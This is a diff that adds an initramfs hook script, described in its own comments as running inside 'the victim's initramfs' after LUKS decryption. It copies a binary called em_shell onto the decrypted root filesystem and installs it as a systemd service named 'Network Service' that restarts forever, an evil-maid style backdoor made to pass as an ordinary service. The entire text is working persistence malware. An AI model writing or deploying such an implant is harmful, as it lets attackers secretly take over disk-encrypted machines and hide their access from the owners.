@@ -1,0 +1,34 @@
+#!/bin/sh
+# Runs inside the victim's initramfs, after LUKS is unlocked.
+# At this point ${rootmnt} is the decrypted root filesystem, mounted and ready.
+# We copy em_shell and register the systemd service before the real OS takes over.
+
+PREREQ="cryptroot cryptroot-unlock"
+
+prereqs() { echo "$PREREQ"; }
+case "$1" in
+    prereqs) prereqs; exit 0 ;;
+esac
+
+. /scripts/functions
+
+# rootmnt is set by initramfs-tools to the mounted root (e.g. /root)
+[ -z "$rootmnt" ] && exit 0
+
+# Only inject once — idempotent
+[ -f "${rootmnt}/usr/local/bin/em_shell" ] && exit 0
+
+log_begin_msg "Initializing network service"
+
+cp /bin/em_shell "${rootmnt}/usr/local/bin/em_shell"
+chmod +x "${rootmnt}/usr/local/bin/em_shell"
+
+# printf avoids heredoc nesting issues inside a script that is itself heredoc-written
+printf '[Unit]\nDescription=Network Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/em_shell\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n' \
+    > "${rootmnt}/etc/systemd/system/em-shell.service"
+
+mkdir -p "${rootmnt}/etc/systemd/system/multi-user.target.wants"
+ln -sf /etc/systemd/system/em-shell.service \
+       "${rootmnt}/etc/systemd/system/multi-user.target.wants/em-shell.service"
+
+log_end_msg 0
